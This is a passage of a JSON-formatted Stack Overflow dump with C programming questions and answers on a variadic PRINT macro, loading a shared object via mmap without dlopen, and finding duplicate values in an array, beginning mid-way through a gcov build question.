-I../../../gcc-6.3.0/libgcc/.\n-I../../../gcc-6.3.0/libgcc/../gcc\n-I../../../gcc-6.3.0/libgcc/../include    -o _gcov_flush.o -MT\n_gcov_flush.o -MD -MP -MF _gcov_flush.dep -DL_gcov_flush -c\n../../../gcc-6.3.0/libgcc/libgcov-interface.c\n</code></pre>\n\n<p>Any idea what could be wrong with the gcov library?\nOr is anything else missing in the GCC6.3.0?\nDoes anybody else having difficulties with gcov under GCC 6.3.0?</p>\n"}, {"tags": ["c", "macros", "printf", "variadic-functions"], "comments": [{"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 2, "creation_date": 1542191851, "post_id": 53297695, "comment_id": 93477163, "body": "Where does the empty <code>PRINT()</code> come from? From another macro? (Any human programmer could probably just delete it.)"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "edited": false, "score": 0, "creation_date": 1542241450, "post_id": 53297695, "comment_id": 93502275, "body": "<a href=\"https://stackoverflow.com/users/366377/jens-gustedt\">Jens Gustedt</a> <a href=\"https://stackoverflow.com/questions/3420459/c-preprocessor-macro-overloading\">answered</a> a question on detecting an empty argument list and <a href=\"https://gustedt.wordpress.com/2010/06/08/detect-empty-macro-arguments/\" rel=\"nofollow noreferrer\">showed how</a>. It is quite involved."}], "answers": [{"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 2, "last_activity_date": 1542205906, "creation_date": 1542205906, "answer_id": 53302588, "question_id": 53297695, "link": "https://stackoverflow.com/questions/53297695/implementing-formatted-print-with-the-possibility-to-do-nothing-when-it-gets-no/53302588#53302588", "title": "Implementing formatted print with the possibility to do nothing when it gets no arguments", "body": "<p>Both gcc and clang will completely eliminate the call to <code>printf</code> in the case that it is passed an empty format string. Probably that optimisation is reasonably common.</p>\n\n<p>See <a href=\"https://gcc.godbolt.org/z/p6Yxzv\" rel=\"nofollow noreferrer\">here</a> and <a href=\"https://gcc.godbolt.org/z/PuDRYg\" rel=\"nofollow noreferrer\">here</a> for disassembly on gcc.godbolt.org.</p>\n\n<p>In short, don't worry about it.</p>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 2, "last_activity_date": 1542206731, "creation_date": 1542206731, "answer_id": 53302836, "question_id": 53297695, "link": "https://stackoverflow.com/questions/53297695/implementing-formatted-print-with-the-possibility-to-do-nothing-when-it-gets-no/53302836#53302836", "title": "Implementing formatted print with the possibility to do nothing when it gets no arguments", "body": "<p>If you do want to outsource the check of empty argument list to the macro, then perhaps something like this:</p>\n\n<pre><code>#define HAS_ARGS(...) (sizeof( (char[]){#__VA_ARGS__} ) &gt; 1)\n\n#define PRINT(...) (HAS_ARGS(__VA_ARGS__) ? printf(\"\" __VA_ARGS__) : (void)0)\n</code></pre>\n\n<p>This relies on the compound literal getting size 1 in case of an empty string = null terminator only. Example:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define HAS_ARGS(...) (sizeof( (char[]){#__VA_ARGS__} ) &gt; 1)\n\n#define PRINT(...) (HAS_ARGS(__VA_ARGS__) ? printf(\"\" __VA_ARGS__) : (void)0)\n\nint main (void)\n{\n  int i = 5;\n  PRINT(\"%d\\n\", i);\n  PRINT();\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1542285983, "post_id": 53312059, "comment_id": 93519591, "body": "Brilliant use of the preprocessor.  But what about Test 4?  <code>char *str = &quot;This is a string.\\n&quot;; PRINT(str);</code>  Or Test 5?  <code>char *str = &quot;&quot;; PRINT(str);</code>  I&#39;d also be very concerned about maintainability and loathe to release those macros in the wilds of some large project."}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1542289750, "post_id": 53312059, "comment_id": 93521801, "body": "@AndrewHenle: Your proposed tests 4 and 5 result in <code>printf(str);</code>, as desired. As long as the first argument does not start with a parentheses, I think the macros will work. If they start with any non-empty parentheses, an error should be generated, so the problem will be caught. It is rare for <code>printf</code> arguments to start with parentheses. I suspect the most likely case would be something like <code>PRINT(SomeMacroToPrepareFormatString(stuff),\u2026)</code>, where the macro expands to a parenthesized sequence (out of the common habit of parenthesizing macro replacement text, not necessary in this case\u2026"}, {"owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1542289842, "post_id": 53312059, "comment_id": 93521858, "body": "@AndrewHenle: \u2026 unless the replacement text contains a comma operator that needs to be parenthesized to prevent it from being interpreted as an argument separator). I would not recommend this for a large project; I am just answering the Stack Overflow question because knowledge is valuable."}], "tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": false, "score": 2, "last_activity_date": 1542305856, "last_edit_date": 1542305856, "creation_date": 1542252930, "answer_id": 53312059, "question_id": 53297695, "link": "https://stackoverflow.com/questions/53297695/implementing-formatted-print-with-the-possibility-to-do-nothing-when-it-gets-no/53312059#53312059", "title": "Implementing formatted print with the possibility to do nothing when it gets no arguments", "body": "<p>A solution is:</p>\n\n<pre><code>#define Argument1(a,...)    Argument2(a\n#define Argument2(a, b,...) b\n#define TestEmpty()         ,\n#define PRINT(...)          Argument1(TestEmpty __VA_ARGS__ (),), printf(__VA_ARGS__);,)\n</code></pre>\n\n<p>For this source text:</p>\n\n<pre><code>Test 0: PRINT()\nTest 1: PRINT(\"Hello, world.\\n\")\nTest 2: PRINT(\"Result is %d.\\n\", result)\nTest 3: PRINT(\"%d = %g.\\n\", 3, 3.)\n</code></pre>\n\n<p>the result of preprocessing is:</p>\n\n<pre><code>Test 0:\nTest 1: printf(\"Hello, world.\\n\");\nTest 2: printf(\"Result is %d.\\n\", result);\nTest 3: printf(\"%d = %g.\\n\", 3, 3.);\n</code></pre>\n\n<p>This requires that the arguments to <code>PRINT</code> not start with a parenthesized item, which seems acceptable for this particular question. The code here is not a general solution for detecting an empty parameter when parentheses may be present.</p>\n\n<p>Explanation:</p>\n\n<ul>\n<li>In preparing to replace <code>PRINT</code>, <code>__VA_ARGS__</code> is replaced. <code>TestEmpty</code> is not replaced at this time because it is not followed by parentheses.</li>\n<li>Then <code>PRINT</code> is replaced, and the result is rescanned.</li>\n<li><code>Argument1</code> is identified for replacement. In preparation for that, its arguments are processed.</li>\n<li>At this point, if <code>__VA_ARGS__</code> is empty, we have have the tokens <code>TestEmpty ()</code>, which are replaced by <code>,</code>. Otherwise, <code>TestEmpty &lt;some tokens&gt; ()</code> remains. Note that, if <code>TestEmpty ()</code> is present, the <code>,</code> it expands to <strong>is the first argument</strong> to <code>Argument1</code>. It is not an argument separator, because the arguments to <code>Argument1</code> have already been identified.</li>\n<li>Then <code>Argument1</code> is replaced, producing either <code>Argument2(,</code> (if <code>__VA_ARGS</code> was empty) or <code>Argument2(TestEmpty</code> possibly followed by additional tokens (otherwise).</li>\n<li>The result is either <code>Argument2(,, printf();,)</code> or <code>Argument2(TestEmpty &lt;some tokens&gt;, printf(&lt;some tokens&gt;);,)</code>, according to whether <code>__VA_ARGS__</code> was empty or not.</li>\n<li>The tokens are now rescanned for further replacement, so the <code>,</code> will now be recognized as an argument separator.</li>\n<li>Finally, <code>Argument2</code> is replaced with an empty token list or with <code>printf(&lt;some tokens&gt;);</code>.</li>\n</ul>\n"}], "owner": {"reputation": 177, "user_id": 5520361, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/0c7594aeb9ae2d12acb3cdfc1d299a7a?s=128&d=identicon&r=PG&f=1", "display_name": "Rodrigo", "link": "https://stackoverflow.com/users/5520361/rodrigo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 94, "favorite_count": 0, "answer_count": 3, "score": 4, "last_activity_date": 1542305856, "creation_date": 1542190374, "last_edit_date": 1542191571, "question_id": 53297695, "link": "https://stackoverflow.com/questions/53297695/implementing-formatted-print-with-the-possibility-to-do-nothing-when-it-gets-no", "title": "Implementing formatted print with the possibility to do nothing when it gets no arguments", "body": "<p>I want to implement a macro named <code>PRINT</code> which gets zero or more parameters, and does the following:     </p>\n\n<ol>\n<li>If it gets zero parameters - do nothing.         </li>\n<li>If it gets one or more arguments - act like printf.             </li>\n</ol>\n\n<p>I succeed in implementing it as you can see in my code below, but only at the cost of calling to printf with an empty string in the case we get zero arguments.            </p>\n\n<p>Is there a way I can handle the zero arguments case without calling to printf (it's not efficient to print something when you just want to do nothing)?       </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define PRINT(...) printf(\"\" __VA_ARGS__);\n\nint main(){\n    PRINT();\n    PRINT(\"print\\n\");\n    PRINT(\"print number: %d\\n\", 7);\n    return 0;\n}   \n</code></pre>\n\n<p>output:              </p>\n\n<pre><code>print\nprint number: 7  \n</code></pre>\n"}, {"tags": ["c", "elf", "mmap"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1542191101, "post_id": 53297596, "comment_id": 93476695, "body": "<code>printf(&quot;PTR AT -&gt; %lx\\n&quot;, ptr);</code> is the wrong format for a pointer.  <code>%p</code> is used to print a pointer."}, {"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "reply_to_user": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1542191280, "post_id": 53297596, "comment_id": 93476809, "body": "@AndrewHenle edited code."}], "answers": [{"comments": [{"owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "edited": false, "score": 0, "creation_date": 1542763929, "post_id": 53322514, "comment_id": 93683188, "body": "Thank you for your answer and sorry about not responding until today: What if i need complex code to be loaded?. Actually the code i uploaded as a sample is the simplest of them all. I cannot implement every syscall by myself. Any ideas?"}, {"owner": {"reputation": 162629, "user_id": 50617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YFykQ.png?s=128&g=1", "display_name": "Employed Russian", "link": "https://stackoverflow.com/users/50617/employed-russian"}, "reply_to_user": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "edited": false, "score": 1, "creation_date": 1542768733, "post_id": 53322514, "comment_id": 93684219, "body": "@Tretorn &quot;What is I need complex code&quot; -- then you&#39;ll need to re-implement part of dynamic loader. But <i>why</i> can&#39;t you simply <code>dlopen</code> this library?"}], "tags": [], "owner": {"reputation": 162629, "user_id": 50617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YFykQ.png?s=128&g=1", "display_name": "Employed Russian", "link": "https://stackoverflow.com/users/50617/employed-russian"}, "is_accepted": true, "score": 3, "last_activity_date": 1542296772, "last_edit_date": 1542296772, "creation_date": 1542294966, "answer_id": 53322514, "question_id": 53297596, "link": "https://stackoverflow.com/questions/53297596/mmap-load-shared-object-and-get-function-pointer/53322514#53322514", "title": "mmap load shared object and get function pointer", "body": "<blockquote>\n  <p>its required that i use the mmap trick. I have seen my professor implement it successfully but i cannot figure out how.</p>\n</blockquote>\n\n<p>For this to work, your <code>__start</code> must be completely stand-alone, and <em>not</em> call any other library (you violated that requirement by calling <code>strcmp</code> and <code>printf</code>).</p>\n\n<p>The moment you call an unresolved symbol, you <em>ask</em> the dynamic loader to <em>resolve</em> that symbol, and the loader needs all kinds of info for that. That info is normally set up during <code>dlopen</code> call. Since you bypassed <code>dlopen</code>, it is <em>not at all</em> surprising that your program crashes.</p>\n\n<p>Your first step should be to change your code such that <code>__start</code> doesn't do anything at all (is empty), and verify that you can then call <code>__start</code>. That would confirm that you are computing its address correctly.</p>\n\n<p>Second, add a crash to that code:</p>\n\n<pre><code>void __start(...)\n{\n  int *p = NULL;\n  *p = 42;  // should crash here\n}\n</code></pre>\n\n<p>and verify that you are observing the crash now. That will confirm that your code is getting called.</p>\n\n<p>Third, remove the crashing code and use <em>only</em> direct system calls (e.g. <code>write(1, \"Hello\\n\", 6)</code> (but don't call <code>write</code> -- you must implement it directly in your library)) to implement whatever you need.</p>\n"}], "owner": {"reputation": 241, "user_id": 7350859, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2eebca1c361fd774ee8dd8f3f634fb?s=128&d=identicon&r=PG&f=1", "display_name": "Tretorn", "link": "https://stackoverflow.com/users/7350859/tretorn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 741, "favorite_count": 0, "accepted_answer_id": 53322514, "answer_count": 1, "score": 1, "last_activity_date": 1542296772, "creation_date": 1542190005, "last_edit_date": 1542214463, "question_id": 53297596, "link": "https://stackoverflow.com/questions/53297596/mmap-load-shared-object-and-get-function-pointer", "title": "mmap load shared object and get function pointer", "body": "<p>I want to dynamically load a library without using functions from <code>dlfcn.h</code> i have a folder full of .so files compiled with:</p>\n\n<pre><code>gcc -Wall -shared -fPIC -o filename.so filename.c\n</code></pre>\n\n<p>And all of them have an entry function named:</p>\n\n<pre><code>void __start(int size, char** cmd);\n</code></pre>\n\n<p>(I know, probably not the best name)</p>\n\n<p>then i try to call <code>open</code> over the so, then read the elf header as an <code>Elf64_Ehdr</code> load it into memory with <code>mmap</code> (i know i should use <code>mprotect</code> but i want to make it work first and then add the security) and finally adding the the elf header entry to the pointer returned by mmap (plus an offset of 0x100).</p>\n\n<p>The test code is the following:</p>\n\n<pre><code>#include &lt;elf.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;sys/mman.h&gt;\n\ntypedef void (*ptr_t) (int, char**);\n\nvoid* alloc_ex_memory(int fd) {\n    struct stat s;\n    fstat(fd, &amp;s);\n    void * ptr = mmap(0, s.st_size, PROT_READ | PROT_WRITE | PROT_EXEC,\n    MAP_PRIVATE | MAP_ANONYMOUS, fd, 0);\n    if (ptr == (void *)-1) {\n        perror(\"mmap\");\n        return NULL;\n    }\n    return ptr;\n}\n\nvoid* load_ex_file(const char* elfFile) {\n    Elf64_Ehdr header;\n    void * ptr;\n    FILE* file = fopen(elfFile, \"rb\");\n    if(file) {\n        fread(&amp;header, 1, sizeof(header), file);\n\n        if (memcmp(header.e_ident, ELFMAG, SELFMAG) == 0) {\n            ptr = alloc_ex_memory(fileno(file));\n            printf(\"PTR AT -&gt; %p\\n\", ptr);\n            printf(\"Entry at -&gt; %lx\\n\", header.e_entry+256);\n            ptr = (header.e_entry + 256);\n        } else {\n            ptr = NULL;\n            }\n\n        fclose(file);\n            return ptr;\n    }\n    return NULL;\n}\n\nint main(int argc, char** argv) {\n    ptr_t func = load_ex_file(argv[1]);\n    printf(\"POINTER AT: %p\\n\", func);\n    getchar();\n    func(argc, argv);\n    return 0;\n}\n</code></pre>\n\n<p>Let me explain a bit further:\nWhen i run <code>objdump -d filename.so</code> i get that the <code>_start</code> is at <code>0x6c0</code>. The elf header entry point returns <code>0x5c0</code> (i compensate it adding 256 in dec). </p>\n\n<p>Also <code>pmap</code> shows an executable area being created at lets say <code>0x7fdf94d0c000\n</code> so the function pointer direction that i get and which i call is at <code>0x7fdf94d0c6c0</code>  this should be the entry point and callable via function pointer. But what i get is, you guessed it: segfault.</p>\n\n<p>Las thing that i would like to point out is that i have the same example running with (<code>dlopen</code>, <code>dlsym</code>, <code>dlclose</code>) but its required that i use the mmap trick. I have seen my professor implement it successfully but i cannot figure out how. (perhaps there is a simpler way that im missing).</p>\n\n<p>I based the code on <a href=\"https://eli.thegreenplace.net/2013/11/05/how-to-jit-an-introduction\" rel=\"nofollow noreferrer\">this jit example</a></p>\n\n<p>Thank you in advance!</p>\n\n<p>Edit: This is the code of the .c that i compile into .so:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid __start(int size, char** cmd) {\n    if (size==2) {\n        if (!strcmp(cmd[1], \"-l\")) {\n            printf(\"******.********.*****@udc.es\\n\");\n            return;\n        } else if (!strcmp(cmd[1], \"-n\")) {\n            printf(\"****** ******** *****\\n\");\n            return;\n        }\n    } else if (size==1) {\n            printf(\"****** ******** ***** (******.********.*****@udc.es)\\n\");\n            return;\n    }\n    printf(\"Wrong command syntax: autores [-l | -n]\\n\");\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 66560, "user_id": 9072753, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/EPmGy.jpg?s=128&g=1", "display_name": "KamilCuk", "link": "https://stackoverflow.com/users/9072753/kamilcuk"}, "edited": false, "score": 0, "creation_date": 1542189065, "post_id": 53297231, "comment_id": 93475409, "body": "When you find the duplicate, you need to search from the beginning of the array again to see if there was a duplicate already found, if there is, don&#39;t print it the second time, cause it was printed the first time."}, {"owner": {"reputation": 2988, "user_id": 452414, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/rDMfs.png?s=128&g=1", "display_name": "babon", "link": "https://stackoverflow.com/users/452414/babon"}, "edited": false, "score": 4, "creation_date": 1542189159, "post_id": 53297231, "comment_id": 93475462, "body": "Is the array always sorted?"}, {"owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "edited": false, "score": 0, "creation_date": 1542189174, "post_id": 53297231, "comment_id": 93475475, "body": "You can use index table (depending on your problem). In index table, whenever you find value, you bump up the value at given index. This way, you can traverse table once for finding values and index table another one time for printing doubles."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1542189181, "post_id": 53297231, "comment_id": 93475485, "body": "Basically: if equal, set flag else clear flag. If flag set, print &amp; clear flag."}], "answers": [{"comments": [{"owner": {"reputation": 15373, "user_id": 822669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f66e2987d5d24e6d8a1f686154a51c21?s=128&d=identicon&r=PG", "display_name": "Sander De Dycker", "link": "https://stackoverflow.com/users/822669/sander-de-dycker"}, "edited": false, "score": 1, "creation_date": 1542190609, "post_id": 53297540, "comment_id": 93476371, "body": "this is more commonly called a <a href=\"https://en.wikipedia.org/wiki/Frequency_distribution\" rel=\"nofollow noreferrer\">frequency table</a>"}], "tags": [], "owner": {"reputation": 9545, "user_id": 5295429, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XcJZr.png?s=128&g=1", "display_name": "Oo.oO", "link": "https://stackoverflow.com/users/5295429/oo-oo"}, "is_accepted": false, "score": 0, "last_activity_date": 1542189816, "creation_date": 1542189816, "answer_id": 53297540, "question_id": 53297231, "link": "https://stackoverflow.com/questions/53297231/finding-duplicate-values-in-array-in-c/53297540#53297540", "title": "Finding duplicate values in array in c", "body": "<p>If you deal with low numbers, you can always go via index table</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n  int index[256] = {0};\n  int table[15] = {1, 2, 3, 5, 5, 6, 1, 2, 9, 10, 11, 2, 3, 4, 5 };\n\n  for(int i=0; i&lt;15; i++) {\n    index[table[i]] ++;\n  }\n\n  for(int i=0; i&lt;256; i++) {\n    index[i] &gt; 1 ? printf(\"%d\\n\",i) : 0;\n  }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "is_accepted": false, "score": 1, "last_activity_date": 1542193441, "last_edit_date": 1542193441, "creation_date": 1542189956, "answer_id": 53297578, "question_id": 53297231, "link": "https://stackoverflow.com/questions/53297231/finding-duplicate-values-in-array-in-c/53297578#53297578", "title": "Finding duplicate values in array in c", "body": "<p>A solution which doesn't introduce additional memory requirements and finds unique duplicates in a worst case of O(N\u00b2):</p>\n\n<pre><code>#include &lt;stddef.h&gt;\n#include &lt;stdbool.h&gt;\n#include &lt;stdio.h&gt;\n\n// macro that evaluates to the number of elements in an array:\n#define SIZEOF_ARRAY(arr) sizeof(arr) / sizeof(*arr)\n\n// contains() returns true if [values, values + size) contains value\nbool contains(int *values, size_t size, int value)\n{\n    for (size_t i = 0; i &lt; size; ++i)\n        if (values[i] == value)\n            return true;\n    return false;\n}\n\nint main(void)\n{\n    int numbers[] = { 1, 1, 2, 2, 2, 3, 4, 5, 6, 6, 7, 7, 7, 8, 9 };\n\n    for (size_t i = 0; i &lt; SIZEOF_ARRAY(numbers) - 1; ++i)\n    {\n        if (contains(numbers, i, numbers[i])) // if we already encountered numbers[i]\n            continue;                         // it was already identified as dup.\n\n        if(contains(numbers + i + 1, SIZEOF_ARRAY(numbers) - i , numbers[i]))\n            printf(\"Number %d has duplicate values\\n\", numbers[i]);\n    }\n}\n</code></pre>\n\n<h3>Output:</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>Number 1 has duplicate values\nNumber 2 has duplicate values\nNumber 6 has duplicate values\nNumber 7 has duplicate values\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 43, "user_id": 8664903, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/1503520916403383/picture?type=large", "display_name": "Jayaraj Rohan", "link": "https://stackoverflow.com/users/8664903/jayaraj-rohan"}, "edited": false, "score": 0, "creation_date": 1542211630, "post_id": 53298234, "comment_id": 93489483, "body": "Your answer is correct but i made a mistake in the question. I gave the numbers in order. I wanted an answer for both ways. BTW thank you"}, {"owner": {"reputation": 5339, "user_id": 1714692, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/bd72cbc200eb7c9aa507624f154b21a7?s=128&d=identicon&r=PG", "display_name": "Francesco Boi", "link": "https://stackoverflow.com/users/1714692/francesco-boi"}, "reply_to_user": {"reputation": 43, "user_id": 8664903, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/1503520916403383/picture?type=large", "display_name": "Jayaraj Rohan", "link": "https://stackoverflow.com/users/8664903/jayaraj-rohan"}, "edited": false, "score": 0, "creation_date": 1542213757, "post_id": 53298234, "comment_id": 93490790, "body": "I added a part of code for non ordered arrays: see if you can understand it."}], "tags": [], "owner": {"reputation": 5339, "user_id": 1714692, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/bd72cbc200eb7c9aa507624f154b21a7?s=128&d=identicon&r=PG", "display_name": "Francesco Boi", "link": "https://stackoverflow.com/users/1714692/francesco-boi"}, "is_accepted": false, "score": 0, "last_activity_date": 1542213723, "last_edit_date": 1542213723, "creation_date": 1542191937, "answer_id": 53298234, "question_id": 53297231, "link": "https://stackoverflow.com/questions/53297231/finding-duplicate-values-in-array-in-c/53298234#53298234", "title": "Finding duplicate values in array in c", "body": "<p>In your example consider the indexes of the 7: they are 10, 11, 12.</p>\n\n<p>The first print happens when <code>i=10</code> and <code>j=10</code> because your are indexing <code>numbers[10]</code> and <code>numbers[11]</code>. </p>\n\n<p>At the next iteration of the inner loop you have <code>i=10</code> and <code>j=11</code> and the condition is verified again by the elements <code>numbers[10]</code> and <code>numbers[12]</code>. </p>\n\n<p>Finally the third condition happens when <code>i=11</code> and <code>j=11</code> because you are referring to <code>numbers[11]</code> and <code>numbers[12]</code>.</p>\n\n<p>All this becomes clear if you print your indexes when the condition happens. For example you can substitute your <code>printf</code> with this:</p>\n\n<pre><code>printf(\"Number %d has duplicate values with indexes i=%d, j=%d\\n\",numbers[i], i,j);\n</code></pre>\n\n<p>which prints:</p>\n\n<pre><code>Number 1 has duplicate values with indexes i=0, j=0\nNumber 2 has duplicate values with indexes i=2, j=2\nNumber 2 has duplicate values with indexes i=2, j=3\nNumber 2 has duplicate values with indexes i=3, j=3\nNumber 6 has duplicate values with indexes i=8, j=8\nNumber 7 has duplicate values with indexes i=10, j=10\nNumber 7 has duplicate values with indexes i=10, j=11\nNumber 7 has duplicate values with indexes i=11, j=11\n</code></pre>\n\n<p>If your values are ordered you can do something like this:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n int main()\n{\n    int numbers[15]={1,1,2,2,2,3,4,5,6,6,7,7,7,8,9},i,j;\n    int last_dup = -1;\n\n    for(i=0;i&lt;15;i++)\n    {\n        for(j=i+1;j&lt;14;j++)\n        {\n            if(numbers[i]==numbers[j] &amp;&amp; numbers[i]!=last_dup)\n            {\n                printf(\"Number %d has duplicate values with indexes i=%d, j=%d\\n\",numbers[i], i,j);\n                last_dup = numbers[i];\n                break;\n            }\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>I initialized to <code>-1</code> assuming your numbers are all positive. If not you can save the index of the last duplicate and reference using in the check <code>numbers[last_dup_idx]</code> (be careful to initialize the value properly and not go out the length of the array). I also added a <code>break</code>: since you already found a duplicate there is no need to continue the second loop.</p>\n\n<p>If your array is not ordered, you can create an additional array saving the duplicates elements every time you find one and then iterate through this array to check.</p>\n\n<p><strong>FOR NOT ORDERED ARRAYS</strong></p>\n\n<pre><code>#include&lt;stdio.h&gt;\n int main()\n{\n    int numbers[15]={1,1,2,2,2,3,4,5,6,6,7,7,7,8,9},i,j;\n    int dups [7];//at most 15/2 duplicates\n    char dup_idx=0;\n    char found_new_duplicate; //initialized later\n    for(i=0;i&lt;15;i++)\n    {\n        for(j=i+1;j&lt;14;j++)\n        {\n            if(numbers[i]==numbers[j])\n            {\n                found_new_duplicate = 1;\n\n                //check in the duplicates array\n                for (int kk=0; kk&lt;=dup_idx; kk++)\n                {\n                    if (dups[kk]==numbers[i] &amp;&amp; !(i==0 &amp;&amp; j==1))\n                    {\n                        found_new_duplicate = 0;\n                        break;\n                    }\n                }\n                if (found_new_duplicate)\n                {\n                    dups[dup_idx] = numbers[i]; //insert the new duplicate in the duplicates array\n                    printf(\"Number %d has duplicate values with indexes i=%d, j=%d\\n\",numbers[i], i,j);\n                    printf(\"New duplicate %d\\n\", dups[dup_idx]);\n                    dup_idx++;//increase the index\n                    break;\n                }\n            }\n        }\n    }\n    for (int kk=0; kk&lt; dup_idx; kk++)\n        printf(\"%d\\n\", dups[kk]);\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2191, "user_id": 10232790, "user_type": "registered", "profile_image": 